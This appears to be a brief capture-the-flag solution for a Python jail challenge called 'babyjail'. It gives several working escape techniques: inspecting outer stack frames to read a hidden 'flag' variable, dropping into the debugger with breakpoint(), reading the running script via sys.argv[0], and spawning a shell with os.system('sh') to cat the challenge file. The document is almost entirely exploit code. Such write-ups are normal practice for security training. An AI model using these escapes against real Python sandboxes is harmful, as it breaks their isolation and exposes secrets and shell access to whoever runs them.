import inspect

inspect.getouterframes(inspect.currentframe())[-1].frame.f_locals['flag']

#alternatively:
#breakpoint()
#u
#<press enter until oldest frame>
#flag

#easier solution:
import sys

open(sys.argv[0]).read()

#alternatively
#import os; os.system('sh')
#<do whatever you need to find out the script is at /home/user/babyjail.py
#cat /home/user/babyjail.py